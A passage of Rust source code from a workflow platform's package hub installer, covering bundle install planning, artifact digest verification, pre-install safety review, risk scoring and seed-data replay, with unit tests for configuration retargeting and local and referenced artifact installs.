            .unwrap_or_default()
    }

    fn pipelines_not_activated(&self) -> Vec<String> {
        self.prepared
            .as_ref()
            .map(|prepared| prepared.pipelines_not_activated.clone())
            .unwrap_or_default()
    }
}

impl PreparedProjectBundle {
    fn build(
        layout: &ResolvedProjectLayout,
        kept: &[(String, &HubPackageFile)],
        artifacts: &HubArtifactChannel,
        active_pipelines: &[String],
    ) -> Result<Self, PlatformError> {
        let mut entries: Vec<PlannedProjectBundleEntry> = Vec::with_capacity(kept.len());
        let mut registrations = Vec::new();
        let mut configuration = None;
        let mut lock = None;
        for (destination, file) in kept {
            // Every entry's bytes -- carried and referenced alike -- are
            // produced here, before a project exists. A digest mismatch or an
            // artifact this channel cannot reach refuses the install with
            // nothing created and nothing to clean up.
            let bytes = hub_entry_bytes(file, artifacts)?;
            let index = entries.len();
            if destination == PROJECT_CONFIGURATION_FILE {
                if configuration.is_some() {
                    return Err(PlatformError::new(
                        "HUB_INSTALL",
                        "project bundle contains more than one zebflow.yaml",
                    ));
                }
                configuration = Some((index, decode_bundle_configuration(file, &bytes)?));
            } else if destination == DEPENDENCY_LOCK_FILE {
                if lock.is_some() {
                    return Err(PlatformError::new(
                        "HUB_INSTALL",
                        "project bundle contains more than one zeb.lock",
                    ));
                }
                lock = Some((index, decode_bundle_dependency_lock(file, &bytes)?));
            } else if layout.is_pipeline_rel_path(destination)
                && let Some(registration) =
                    planned_pipeline_registration(layout, destination, &bytes)
            {
                registrations.push(registration);
            }
            entries.push(PlannedProjectBundleEntry {
                destination: destination.clone(),
                bytes,
            });
        }
        let configuration = configuration.ok_or_else(|| {
            PlatformError::new("HUB_INSTALL", "project bundle is missing zebflow.yaml")
        })?;

        let registered = registrations
            .iter()
            .map(|registration| registration.identity.clone())
            .collect::<BTreeSet<_>>();
        let mut pipelines_activated = Vec::new();
        let mut pipelines_not_activated = Vec::new();
        for named in active_pipelines {
            let normalized = normalize_repo_rel(named);
            if normalized.is_empty() || !normalized.ends_with(PIPELINE_DEFINITION_EXTENSION) {
                continue;
            }
            let identity = normalize_pipeline_file_rel_path(layout, &normalized);
            if registered.contains(&identity) {
                pipelines_activated.push(identity);
            } else {
                // Named active by the publisher and not among the pipelines
                // this install registers: either the scope dropped it or the
                // bundle never carried it. Activating it would fail after every
                // file had been written, so it is reported and not attempted.
                pipelines_not_activated.push(identity);
            }
        }

        Ok(Self {
            entries,
            registrations,
            pipelines_activated,
            pipelines_not_activated,
            configuration,
            lock,
        })
    }

    fn pipeline_identities(&self) -> Vec<String> {
        self.registrations
            .iter()
            .map(|registration| registration.identity.clone())
            .collect()
    }

    /// The entries to write, with the bundle's own `zebflow.yaml` and `zeb.lock`
    /// rewritten to name `project`.
    ///
    /// Only the two documents that carry a project name change; every other
    /// entry is written exactly as it was reviewed.
    fn retargeted_entries(
        &self,
        project: &str,
    ) -> Result<Vec<PlannedProjectBundleEntry>, PlatformError> {
        let mut entries = self.entries.clone();
        let (index, document) = &self.configuration;
        let mut metadata = document.metadata.clone();
        metadata.name = project.to_string();
        entries[*index].bytes = crate::contracts::encode_contract_yaml::<
            ProjectConfigurationContract,
        >(metadata, document.spec.clone())
        .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        if let Some((index, document)) = &self.lock {
            let mut metadata = document.metadata.clone();
            metadata.name = project.to_string();
            entries[*index].bytes =
                encode_contract::<DependencyLockContract>(metadata, document.spec.clone())
                    .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        }
        Ok(entries)
    }
}

/// The safety review of a project bundle, read at the paths it installs to.
///
/// Keyed on the destination rather than the manifest path, so the review reads
/// the file the install would place and not the one the publisher kept.
fn review_project_bundle_entries(
    layout: &ResolvedProjectLayout,
    files: &[HubPackageFile],
    artifacts: &HubArtifactChannel,
) -> PackageSafetyReview {
    let placement = HubInstallPlacement::whole_project();
    let entries = files
        .iter()
        .map(|file| package_policy_entry(&placement.destination(&file.rel_path), file, artifacts))
        .collect::<Vec<_>>();
    review_package_entries(
        layout,
        &entries,
        Vec::new(),
        PackageReviewOptions::default(),
    )
}

/// The registration one pipeline entry produces, or `None` when its bytes are
/// not text.
///
/// It reads the bytes this install writes, so a pipeline that reaches disk
/// through a referenced artifact is registered exactly as a carried one is.
/// Reading only the carried form left a referenced pipeline on disk and
/// unregistered, which is to say invisible.
fn planned_pipeline_registration(
    layout: &ResolvedProjectLayout,
    destination: &str,
    bytes: &[u8],
) -> Option<PlannedPipelineRegistration> {
    let source = String::from_utf8(bytes.to_vec()).ok()?;
    let description = decode_pipeline_graph(source.as_bytes())
        .ok()
        .and_then(|document| document.spec.description)
        .unwrap_or_default();
    let trigger_kind = derive_trigger_kind_from_source(&source).unwrap_or_default();
    Some(PlannedPipelineRegistration {
        identity: normalize_pipeline_file_rel_path(layout, destination),
        description,
        trigger_kind,
        source,
    })
}

/// The bundle's own project configuration, decoded from the bytes it writes.
///
/// Decoding it here rather than after the project is created is the point: a
/// bundle whose `zebflow.yaml` is missing, duplicated or unreadable is refused
/// while there is still nothing to clean up.
fn decode_bundle_configuration(
    file: &HubPackageFile,
    bytes: &[u8],
) -> Result<ContractDocument<ProjectConfigurationSpec>, PlatformError> {
    require_carried_text_entry(file, "zebflow.yaml")?;
    crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(bytes)
        .map_err(|err| PlatformError::new("HUB_INSTALL", format!("invalid zebflow.yaml: {err}")))
}

/// The bundle's own dependency lock, decoded from the bytes it writes.
fn decode_bundle_dependency_lock(
    file: &HubPackageFile,
    bytes: &[u8],
) -> Result<ContractDocument<DependencyLockSpec>, PlatformError> {
    require_carried_text_entry(file, "zeb.lock")?;
    decode_contract::<DependencyLockContract>(bytes)
        .map_err(|err| PlatformError::new("HUB_INSTALL", format!("invalid zeb.lock: {err}")))
}

/// Refuses a document the install rewrites and cannot rewrite in place.
fn require_carried_text_entry(file: &HubPackageFile, name: &str) -> Result<(), PlatformError> {
    match file.supply() {
        Some(HubPackageFileSupply::Carried(_)) if file.encoding != "base64" => Ok(()),
        _ => Err(PlatformError::new(
            "HUB_INSTALL",
            format!("{name} must be a carried text entry"),
        )),
    }
}

/// Refuses a project bundle whose reviewable content the review cannot read.
///
/// Installing a project bundle writes its files, registers every pipeline among
/// them, applies the schema and seed data it carries, and activates the
/// pipelines it names. None of that is undone by reviewing afterwards, so the
/// decision is taken before the project exists: a refusal leaves nothing
/// behind, not an empty project someone has to clean up.
///
/// It judges the review [`ProjectBundleInstallPlan`] already holds rather than
/// reading the package again, so the verdict shown by a pre-install review and
/// the verdict enforced by the install are the same verdict.
///
/// This refuses what cannot be *read*, and what a project's layout does not
/// accept as a file type at all. It does not refuse hostile behaviour: a bundle
/// whose pipelines parse and whose paths are ordinary source installs however
/// hostile it is, because no content detector produces a violation yet -- the
/// review reports those as warnings and a risk level.
fn refuse_unreviewable_project_bundle(review: &PackageSafetyReview) -> Result<(), PlatformError> {
    if review.is_installable() {
        return Ok(());
    }
    Err(PlatformError::new(
        "HUB_REMOTE_INSTALL_REFUSED",
        format!(
            "project bundle cannot be installed: {}",
            review.violations.join("; ")
        ),
    ))
}

/// Whether this bundle entry is schema or seed SQL rather than source.
fn install_entry_is_schema(layout: &ResolvedProjectLayout, rel_path: &str) -> bool {
    let rel = normalize_repo_rel(rel_path);
    layout.is_schema_rel_path(&rel)
        || layout.is_sqlite_schema_rel_path(&rel)
        || initial_data_engine_for_path(layout, &rel).is_some()
}

/// Files the project needs whatever else the scope drops.
///
/// `zebflow.yaml` is not optional -- the install refuses a bundle without one --
/// so a code-free install that dropped it would install nothing at all rather
/// than the data model it was asked for. The lock and the initialization plan
/// describe the install itself and are kept for the same reason.
fn install_entry_is_project_configuration(rel_path: &str) -> bool {
    let rel = normalize_repo_rel(rel_path);
    rel == PROJECT_CONFIGURATION_FILE || rel == DEPENDENCY_LOCK_FILE || rel == "zebflow.init.json"
}

/// Whether this scope installs the entry landing at `destination`.
fn install_entry_is_in_scope(
    layout: &ResolvedProjectLayout,
    destination: &str,
    scope: HubInstallScope,
) -> bool {
    if install_entry_is_project_configuration(destination) {
        return true;
    }
    if install_entry_is_schema(layout, destination) {
        return scope.include_schema;
    }
    scope.include_code
}

/// The text of a carried entry, or `None` when it is binary or referenced.
fn entry_text(entry: &HubPackageFile) -> Option<String> {
    let HubPackageFileSupply::Carried(content) = entry.supply()? else {
        return None;
    };
    if entry.encoding == "base64" {
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(content)
            .ok()?;
        return String::from_utf8(bytes).ok();
    }
    Some(content.to_string())
}

/// The bytes one manifest entry contributes to the safety review.
///
/// A referenced entry is fetched and verified through the channel here, so the
/// review reads exactly the bytes the install would write instead of nothing.
/// `Err` is the answer that matters: bytes exist that the review cannot see,
/// which is never the same fact as an empty file. Whether the bytes that do
/// arrive are readable is not decided here -- that judgement belongs to the
/// review's own constructor, so it is made once for every channel.
fn entry_review_bytes<'a>(
    entry: &'a HubPackageFile,
    artifacts: &HubArtifactChannel,
) -> Result<Cow<'a, [u8]>, String> {
    match entry.supply() {
        Some(HubPackageFileSupply::Carried(content)) if entry.encoding == "base64" => {
            base64::engine::general_purpose::STANDARD
                .decode(content)
                .map(Cow::Owned)
                .map_err(|error| format!("base64 content does not decode: {error}"))
        }
        Some(HubPackageFileSupply::Carried(content)) => Ok(Cow::Borrowed(content.as_bytes())),
        Some(HubPackageFileSupply::Referenced(artifact)) => artifacts
            .resolve(&entry.rel_path, artifact, entry.size_bytes)
            .map(Cow::Owned)
            .map_err(|error| error.to_string()),
        None => {
            Err("the entry declares neither carried content nor a referenced artifact".to_string())
        }
    }
}

fn package_policy_entry(
    rel_path: &str,
    entry: &HubPackageFile,
    artifacts: &HubArtifactChannel,
) -> PackagePolicyEntry {
    match entry_review_bytes(entry, artifacts) {
        Ok(bytes) => {
            PackagePolicyEntry::from_bytes(rel_path, &entry.kind, entry.size_bytes, &bytes)
        }
        Err(reason) => {
            PackagePolicyEntry::unresolved(rel_path, &entry.kind, entry.size_bytes, reason)
        }
    }
}

fn install_risk_level(policy: &PackageSafetyReview, has_overwrites: bool) -> String {
    // Overwrites re-score an installable package. They cannot re-score one that
    // is refused outright, so a violation short-circuits before any of it.
    if !policy.violations.is_empty() {
        return PolicyRiskLevel::Blocked.as_str().to_string();
    }
    let mut risk_score = 0;
    if has_overwrites {
        risk_score += 2;
    }
    if !policy.credentials_required.is_empty() {
        risk_score += 1;
    }
    if !policy.external_urls.is_empty() {
        risk_score += 1;
    }
    if !policy.database_effects.is_empty() {
        risk_score += 2;
    }
    if !policy.filesystem_effects.is_empty() {
        risk_score += 1;
    }
    if !policy.network_effects.is_empty() {
        risk_score += 1;
    }
    if !policy.code_execution.is_empty() {
        risk_score += 1;
    }
    if !policy.public_endpoints.is_empty() || !policy.schedules.is_empty() {
        risk_score += 2;
    }
    if !policy.large_files.is_empty() || !policy.seed_data.is_empty() {
        risk_score += 1;
    }
    if risk_score >= 4 {
        "high".to_string()
    } else if risk_score >= 2 {
        "medium".to_string()
    } else {
        "low".to_string()
    }
}

/// The engine that replays `rel_path`, when the installer replays it at all.
///
/// The list and the reading of it live with the safety review, so the report a
/// user approves and the execution that follows can never disagree about which
/// files are initial data.
fn initial_data_engine_for_path<'a>(
    layout: &'a ResolvedProjectLayout,
    rel_path: &str,
) -> Option<&'a str> {
    initial_data_engine_for_rel_path(layout, &normalize_repo_rel(rel_path))
}

fn initial_data_step_from_entry(
    layout: &ResolvedProjectLayout,
    entry: &HubPackageFile,
) -> Option<HubPackageInitialDataStep> {
    let rel = normalize_repo_rel(&entry.rel_path);
    let engine = initial_data_engine_for_path(layout, &rel)?;
    let sql = entry_text(entry)?;
    Some(HubPackageInitialDataStep {
        engine: engine.to_string(),
        path: rel,
        statement_count: split_initial_data_sql(&sql).len(),
        size_bytes: entry.size_bytes,
    })
}

fn execute_project_initial_data(
    data_root: &Path,
    owner: &str,
    project: &str,
    layout: &ProjectFileLayout,
    steps: &[HubPackageInitialDataStep],
) -> Result<(), PlatformError> {
    for step in steps {
        let rel = normalize_repo_rel(&step.path);
        let Some(engine) = initial_data_engine_for_path(&layout.repo_layout, &rel) else {
            return Err(PlatformError::new(
                "HUB_INITIAL_DATA_INVALID",
                format!("initial data path '{}' is not allowed", step.path),
            ));
        };
        if engine != step.engine {
            return Err(PlatformError::new(
                "HUB_INITIAL_DATA_INVALID",
                format!(
                    "initial data path '{}' does not match engine '{}'",
                    step.path, step.engine
                ),
            ));
        }
        let path = sanitize_install_repo_path(layout, &rel)?;
        let sql = fs::read_to_string(&path)?;
        match engine {
            "sekejap" => {
                for stmt in split_initial_data_sql(&sql) {
                    sekejap::execute_sql(data_root, owner, project, &stmt, &[], 0, false)?;
                }
            }
            "sqlite" => {
                sqlite_schema::execute_sql(data_root, owner, project, &sql)?;
            }
            _ => {
                return Err(PlatformError::new(
                    "HUB_INITIAL_DATA_INVALID",
                    format!("unsupported initial data engine '{}'", engine),
                ));
            }
        }
    }
    Ok(())
}

fn collect_initial_data_steps(
    layout: &ResolvedProjectLayout,
    repo_dir: &Path,
    dir: &Path,
    engine: &str,
    steps: &mut Vec<HubPackageInitialDataStep>,
) -> Result<(), PlatformError> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_dir() {
            collect_initial_data_steps(layout, repo_dir, &path, engine, steps)?;
            continue;
        }
        if path
            .extension()
            .and_then(|value| value.to_str())
            .map(|value| value.eq_ignore_ascii_case("sql"))
            != Some(true)
        {
            continue;
        }
        let rel = path
            .strip_prefix(repo_dir)
            .map_err(|err| PlatformError::new("HUB_INITIAL_DATA", err.to_string()))?;
        let rel = normalize_repo_rel(&rel.to_string_lossy());
        if initial_data_engine_for_path(layout, &rel) != Some(engine) {
            continue;
        }
        let sql = fs::read_to_string(&path)?;
        let size_bytes = sql.len();
        steps.push(HubPackageInitialDataStep {
            engine: engine.to_string(),
            path: rel,
            statement_count: split_initial_data_sql(&sql).len(),
            size_bytes,
        });
    }
    Ok(())
}

fn verify_remote_artifact_hash(payload: &RemoteHubArtifactResponse) -> Result<(), PlatformError> {
    if payload.artifact_size_bytes > MAX_REMOTE_HUB_ARTIFACT_BYTES {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_TOO_LARGE",
            "remote artifact exceeds maximum install size",
        ));
    }
    let expected = payload
        .artifact_sha256
        .trim()
        .to_string()
        .if_empty_then(|| payload.version.artifact_sha256.trim().to_string());
    if expected.is_empty() {
        return Err(PlatformError::new(
            "HUB_REMOTE_HASH_MISSING",
            "remote artifact response is missing artifact hash",
        ));
    }
    let document =
        decode_contract_value::<HubPackageContract>(payload.artifact.clone()).map_err(|err| {
            PlatformError::new(
                "HUB_REMOTE_INVALID",
                format!("{} ({})", err, err.category()),
            )
        })?;
    let bytes = encode_hub_package(document.metadata, document.spec)
        .map_err(|err| PlatformError::new("HUB_REMOTE_INVALID", err.to_string()))?;
    let actual = sha256_hex(&bytes);
    if actual != expected {
        return Err(PlatformError::new(
            "HUB_REMOTE_HASH_MISMATCH",
            "remote artifact hash mismatch",
        ));
    }
    Ok(())
}

trait EmptyStringExt {
    fn if_empty_then<F>(self, fallback: F) -> String
    where
        F: FnOnce() -> String;
}

impl EmptyStringExt for String {
    fn if_empty_then<F>(self, fallback: F) -> String
    where
        F: FnOnce() -> String,
    {
        if self.is_empty() { fallback() } else { self }
    }
}

fn sanitize_hub_export_entries(entries: &mut [HubPackageFile]) -> Result<(), PlatformError> {
    for entry in entries.iter_mut() {
        if normalize_repo_rel(&entry.rel_path)
            != crate::contracts::kinds::PROJECT_CONFIGURATION_FILE
        {
            continue;
        }
        let Some(HubPackageFileSupply::Carried(source)) =
            entry.supply().filter(|_| entry.encoding != "base64")
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISH",
                "zebflow.yaml must be a carried text entry",
            ));
        };
        let mut document = crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(
            source.as_bytes(),
        )
        .map_err(|err| PlatformError::new("HUB_PUBLISH", format!("invalid zebflow.yaml: {err}")))?;
        let cfg = &mut document.spec;
        cfg.distribution.hub.producer_enabled = false;
        let content = String::from_utf8(
            crate::contracts::encode_contract_yaml::<ProjectConfigurationContract>(
                document.metadata,
                document.spec,
            )
            .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?,
        )
        .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?;
        entry.size_bytes = content.len();
        entry.content = Some(content);
    }
    Ok(())
}

fn infer_pipeline_meta(source: &str, install_rel: &str) -> (String, String) {
    let fallback_title = Path::new(install_rel)
        .file_stem()
        .and_then(|v| v.to_str())
        .unwrap_or("Imported Pipeline")
        .replace(".zf", "")
        .replace('-', " ");
    let Ok(document) = decode_pipeline_graph(source.as_bytes()) else {
        return (fallback_title, "webhook".to_string());
    };
    let trigger_kind = document
        .spec
        .nodes
        .iter()
        .find_map(|node| {
            node.kind
                .strip_prefix("n.trigger.")
                .map(ToString::to_string)
        })
        .unwrap_or_else(|| "webhook".to_string());
    (fallback_title, trigger_kind)
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROJECT_CONFIGURATION_FIXTURE: &str =
        include_str!("../../../tests/fixtures/contracts/project-configuration/v1-complete.yaml");

    #[test]
    fn hub_export_rejects_malformed_project_configuration() {
        let mut entries = vec![text_export_entry(
            crate::contracts::kinds::PROJECT_CONFIGURATION_FILE,
            "project_configuration",
            "test",
            "not: [valid".to_string(),
        )];
        assert!(sanitize_hub_export_entries(&mut entries).is_err());
        assert!(
            rewrite_project_libraries(
                &mut build_preview(
                    "project_bundle".to_string(),
                    "project".to_string(),
                    "project".to_string(),
                    "Project".to_string(),
                    String::new(),
                    entries,
                    Vec::new(),
                ),
                &[]
            )
            .is_err()
        );
    }

    #[test]
    fn hub_export_sanitizes_project_configuration_through_the_contract() {
        let mut entries = vec![text_export_entry(
            crate::contracts::kinds::PROJECT_CONFIGURATION_FILE,
            "project_configuration",
            "test",
            PROJECT_CONFIGURATION_FIXTURE.to_string(),
        )];
        sanitize_hub_export_entries(&mut entries).unwrap();
        let document = crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(
            entries[0]
                .content
                .as_deref()
                .expect("carried entry")
                .as_bytes(),
        )
        .unwrap();
        assert!(!document.spec.distribution.hub.producer_enabled);
    }

    /// The bundle's own configuration is rewritten to name the project being
    /// created, and a bundle without one is refused while planning -- which is
    /// before any project exists to be left behind.
    #[test]
    fn project_bundle_install_retargets_project_configuration_identity() {
        let configured = configuration_only_bundle(&[text_export_entry(
            PROJECT_CONFIGURATION_FILE,
            "project_configuration",
            "test",
            PROJECT_CONFIGURATION_FIXTURE.to_string(),
        )]);
        let plan =
            ProjectBundleInstallPlan::build(&configured, &no_channel(), HubInstallScope::default())
                .expect("a bundle carrying a configuration plans");
        let entries = plan
            .accept()
            .expect("the bundle is installable")
            .retargeted_entries("installed-project")
            .expect("the configuration is rewritten");
        let document = crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(
            &entries[0].bytes,
        )
        .unwrap();
        assert_eq!(document.metadata.name, "installed-project");

        let error = ProjectBundleInstallPlan::build(
            &configuration_only_bundle(&[]),
            &no_channel(),
            HubInstallScope::default(),
        )
        .expect_err("a bundle with no configuration cannot be planned");
        assert_eq!(error.message, "project bundle is missing zebflow.yaml");
    }

    fn configuration_only_bundle(files: &[HubPackageFile]) -> HubPackageSpec {
        HubPackageSpec {
            asset_kind: HUB_ASSET_KIND_PROJECT_BUNDLE.to_string(),
            title: "Configured".to_string(),
            description: "A bundle carrying only its own configuration.".to_string(),
            layout: None,
            active_pipelines: Vec::new(),
            project_initialization: HubPackageInitialization::default(),
            files: files.to_vec(),
        }
    }

    #[test]
    fn hub_artifact_rejects_missing_and_future_schema() {
        let missing = serde_json::json!({
            "kind": "HubPackage",
            "metadata": {"name": "example", "version": "1.0.0"},
            "spec": {"asset_kind": "pipeline_bundle"}
        });
        let err = parse_hub_artifact_value(missing, "TEST_HUB").unwrap_err();
        assert_eq!(err.code, "TEST_HUB");
        assert!(
            err.message
                .contains("missing required root field 'apiVersion'")
        );

        let future = serde_json::json!({
            "apiVersion": "zebflow.com/v2",
            "kind": "HubPackage",
            "metadata": {"name": "example", "version": "1.0.0"},
            "spec": {}
        });
        let err = parse_hub_artifact_value(future, "TEST_HUB").unwrap_err();
        assert_eq!(err.code, "TEST_HUB");
        assert!(err.message.contains("unsupported apiVersion"));
    }

    fn wasm_node_entry(kind: &str, title: &str, export: &str) -> serde_json::Value {
        serde_json::json!({
            "kind": kind,
            "title": title,
            "description": "E2E WASM node used by installation and runtime tests.",
            "icon": "",
            "ui_category": "wasm.e2e",
            "ui_category_label": "WASM E2E",
            "uses_credentials": [],
            "run": { "module": "core", "export": export },
            "definition": {
                "input_pins": ["in"],
                "output_pins": ["out"],
                "config_schema": { "type": "object" },
                "input_schema": {},
                "output_schema": {},
                "examples": [],
                "failure_semantics": [],
                "fields": [],
                "layout": [],
                "dsl_flags": []
            }
        })
    }

    /// A bundle authored locally has no Hub entry, so before this there was no
    /// way to install it at all. It runs the same review a published package
    /// runs.
    #[test]
    fn a_local_bundle_installs_through_the_same_review_and_installer() {
        use base64::Engine as _;

        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let owner = "superadmin";
        let project = "default";

        let module =
            include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");
        let definition = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": "localpkg", "version": "1.0.0" },
            "spec": {
                "package": "localpkg",
                "version": "1.0.0",
                "title": "Local Package",
                "description": "Installed from a file rather than from a Hub.",
                "icon": "icon.svg",
                "credentials": [],
                "hosts": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [wasm_node_entry("n.x.localpkg.train", "Train", "e2e_train")]
            }
        })
        .to_string();
        let icon = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";
        let artifact = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": "localpkg", "version": "1.0.0" },
            "spec": {
                "asset_kind": "node_bundle",
                "title": "Local Package",
                "description": "Installed from a file rather than from a Hub.",
                "files": [
                    { "rel_path": "definition.json", "kind": "node_definition",
                      "size_bytes": definition.len(), "reason": "local", "content": definition },
                    { "rel_path": "icon.svg", "kind": "asset",
                      "size_bytes": icon.len(), "reason": "local", "content": icon },
                    { "rel_path": "wasm/core.wasm", "kind": "asset",
                      "size_bytes": module.len(), "reason": "local", "encoding": "base64",
                      "content": base64::engine::general_purpose::STANDARD.encode(module) }
                ]
            }
        });

        let review = platform
            .hub
            .review_local_node_bundle(owner, project, "localpkg", "1.0.0", "", artifact.clone())
            .expect("review succeeds");
        assert_eq!(review.asset_kind, "node_bundle");
        assert!(review.installable, "nothing blocks this package");
        assert!(review.violations.is_empty());
        assert!(
            review
                .files_added
                .iter()
                .any(|f| f.ends_with("definition.json")),
            "the review reports what would be written"
        );

        platform
            .hub
            .install_local_node_bundle(owner, project, "localpkg", "1.0.0", "", artifact)
            .expect("install succeeds");

        let installed = platform
            .node_registry
            .get_by_kind(owner, project, "n.x.localpkg.train")
            .expect("the node is installed");
        assert_eq!(
            installed.manifest.source,
            crate::platform::model::NodePackageSource::Wasm
        );
    }

    /// This endpoint installs node bundles, so anything else is refused rather
    /// than quietly installed through a node-shaped door.
    #[test]
    fn a_local_install_refuses_a_package_that_is_not_a_node_bundle() {
        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let artifact = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": "notabundle", "version": "1.0.0" },
            "spec": {
                "asset_kind": "pipeline",
                "title": "Not A Bundle",
                "description": "A pipeline package offered to the node installer.",
                "files": []
            }
        });
        let error = platform
            .hub
            .install_local_node_bundle("superadmin", "default", "notabundle", "1.0.0", "", artifact)
            .expect_err("a non-bundle must be refused");
        assert_eq!(error.code, "NODE_BUNDLE_INSTALL");
    }

    // ── Referenced artifacts ────────────────────────────────────────────
    //
    // A reference carries a digest and never a location, so every test below
    // supplies the location the way its channel does and proves the install
    // either verifies the bytes or refuses without touching what was there.

    /// The real WASM module every referenced-artifact test resolves.
    const REFERENCED_MODULE: &[u8] =
        include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");

    const REFERENCED_ICON: &str = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";

    fn wasm_bundle_definition(package_id: &str, title: &str) -> String {
        serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": package_id, "version": "1.0.0" },
            "spec": {
                "package": package_id,
                "version": "1.0.0",
                "title": title,
                "description": "A bundle whose module may travel beside the document.",
                "icon": "icon.svg",
                "credentials": [],
                "hosts": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [wasm_node_entry(
                    &format!("n.x.{package_id}.train"),
                    "Train",
                    "e2e_train"
                )]
            }
        })
        .to_string()
    }

    /// A bundle document whose module entry is supplied by the caller, so one
    /// package shape covers both the carried and the referenced form.
    fn wasm_bundle_document(
        package_id: &str,
        title: &str,
        module_entry: serde_json::Value,
    ) -> serde_json::Value {
        let definition = wasm_bundle_definition(package_id, title);
        serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": package_id, "version": "1.0.0" },
            "spec": {
                "asset_kind": "node_bundle",
                "title": title,
                "description": "A bundle whose module may travel beside the document.",
                "files": [
                    { "rel_path": "definition.json", "kind": "node_definition",
                      "size_bytes": definition.len(), "reason": "test",
                      "content": definition },
                    { "rel_path": "icon.svg", "kind": "asset",
                      "size_bytes": REFERENCED_ICON.len(), "reason": "test",
                      "content": REFERENCED_ICON },
                    module_entry
                ]
            }
        })
    }

    fn carried_module_entry() -> serde_json::Value {
        serde_json::json!({
            "rel_path": "wasm/core.wasm", "kind": "asset",
            "size_bytes": REFERENCED_MODULE.len(), "reason": "test", "encoding": "base64",
            "content": base64::engine::general_purpose::STANDARD.encode(REFERENCED_MODULE)
        })
    }

    fn referenced_module_entry(sha256: &str) -> serde_json::Value {
        serde_json::json!({
            "rel_path": "wasm/core.wasm", "kind": "asset",
            "size_bytes": REFERENCED_MODULE.len(), "reason": "test",
            "artifact": { "sha256": sha256, "media_type": "application/wasm" }
        })
    }

    /// The producer half of the rule: what a release will not carry, it names.
    ///
    /// Size decides and type does not, so the text entry has to move too --
    /// that is the case the review has to keep reading through the channel.
    #[test]
    fn a_publish_references_only_what_it_will_not_carry() {
        let big_text = "-- seed\n".repeat(HUB_PUBLISH_REFERENCE_THRESHOLD_BYTES / 4);
        let big_binary = vec![0x7f_u8; HUB_PUBLISH_REFERENCE_THRESHOLD_BYTES + 1];
        let mut entries = vec![
            text_export_entry(
                "pipelines/api/small.zf.json",
                "json",
                "test",
                "{}".to_string(),
            ),
            text_export_entry("data/seed.sql", "sql", "test", big_text.clone()),
            HubPackageFile {
                rel_path: "assets/mural.png".to_string(),
                kind: "png".to_string(),
                size_bytes: big_binary.len(),
                reason: "test".to_string(),
                encoding: "base64".to_string(),
                content: Some(base64::engine::general_purpose::STANDARD.encode(&big_binary)),
                artifact: None,
            },
        ];

        let referenced = reference_large_publish_entries(&mut entries).expect("the rule applies");

        assert_eq!(
            entries[0].content.as_deref(),
            Some("{}"),
            "small stays carried"
        );
        assert!(entries[0].artifact.is_none());
        for (index, bytes) in [(1_usize, big_text.as_bytes()), (2, big_binary.as_slice())] {
            let entry = &entries[index];
            assert!(
                entry.content.is_none(),
                "{} is no longer carried",
                entry.rel_path
            );
            assert!(
                entry.encoding.is_empty(),
                "a referenced entry declares no encoding"
            );
            assert_eq!(
                entry.size_bytes,
                bytes.len(),
                "size_bytes still counts raw bytes"
            );
            let artifact = entry
                .artifact
                .as_ref()
                .expect("a digest replaced the content");
            assert_eq!(artifact.sha256, sha256_hex(bytes));
        }
        assert_eq!(
            referenced.iter().map(Vec::as_slice).collect::<Vec<_>>(),
            vec![big_text.as_bytes(), big_binary.as_slice()],
            "the bytes are handed back for the caller to store after the release is accepted"
        );
    }

    /// A refusal has to say who did not have the bytes, because the answer for
    /// a remote hub and for this instance's own store are different problems.
    #[test]
    fn a_remote_channel_refusal_names_the_hub_it_came_from() {
        let root = tempfile::tempdir().unwrap();
        let channel = HubArtifactChannel::Remote(RemoteHubArtifacts {
            cache_base: root.path().to_path_buf(),
            origin: "Studio Hub".to_string(),
        });
        let error = channel
            .resolve(
                "wasm/core.wasm",
                &HubPackageArtifactRef {
                    sha256: sha256_hex(REFERENCED_MODULE),
                    media_type: "application/wasm".to_string(),
                },
                REFERENCED_MODULE.len(),
            )
            .expect_err("nothing was fetched, so nothing resolves");
        assert_eq!(error.code, "HUB_ARTIFACT_MISSING");
        assert!(error.message.contains("Studio Hub"), "{}", error.message);
    }

    /// The store is the cache: bytes two releases share are fetched once, and a
    /// review followed by its install does not fetch twice.
    ///
    /// The URL is deliberately unreachable, so reaching the network at all
    /// would fail the test rather than slow it down.
    #[tokio::test]
    async fn an_artifact_already_in_the_store_is_not_fetched_again() {
        let root = tempfile::tempdir().unwrap();
